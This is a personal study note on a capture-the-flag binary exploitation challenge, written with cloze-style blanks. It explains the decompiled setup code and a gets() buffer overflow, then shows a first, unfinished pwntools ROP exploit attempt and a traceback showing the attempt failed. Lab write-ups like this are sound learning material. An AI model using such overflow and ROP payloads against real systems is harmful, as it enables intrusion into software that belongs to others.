# `close(1)` `close (2)` 
In c, the above closes {{file descriptors}}
- file descriptor 1 is {{stdout}}
- file descriptor 2 is {{stderr}}
After the above calls, the program {{won't be able to output anything}}


# `alarm(0x3Cu)`
sets a timer that will send a SIGALRM signal after 60 seconds (0x3C in hex = 60 in decimal):
- This is common in CTF challenges to prevent programs from {{running indefinitely}}
- If your exploit takes longer than 60 seconds, the program will {{terminate}}
- The `return` value is the number of seconds {{previously remaining}} in any already set alarm

# `init(argc, argv, envp);` 
Calls the initialization function with the main program's parameters:
- `argc`: argument count
- `argv`: array of argument strings
- `envp`: array of environment variables
Inside this init function, it's:
- Disabling buffering for stdin, stdout, and stderr using `setvbuf`
- Setting the alarm timer mentioned above

Looking at the code overall, this appears to be a classic buffer overflow challenge - the `gets(v1)` function is vulnerable to buffer overflow since it doesn't check input length, and the buffer `v1` is only 112 bytes long.


# Attempt 1
```py
from pwn import * 

binary = "./chall"
p = process(binary) 
elf = ELF(binary)
s = '''
b * vuln+50
'''
gdb.attach(p, s)
pause()
pop_rdi = 0x00000000004012c3
payload = flat(
    b'A' * 0x70, # reaches old rbp
    b'B' * 8, # rewriting the old rbp
    pop_rdi
    #elf.got['puts']
    #elf.plt['puts']
)
p.sendline(payload)
p.interactive()
```
## Main problem
the binary does not have puts, and many other libc function loaded, we can't leak shit
```
Traceback (most recent call last):
  File "/home/kali/Desktop/CTF/rop-revenge_hkcert2023/solve.py", line 16, in <module>
    elf.got['puts']s
    ~~~~~~~^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/pwnlib/elf/elf.py", line 164, in __missing__
    raise KeyError(name)
KeyError: 'puts'
[*] Stopped process './chall' (pid 5708)
```
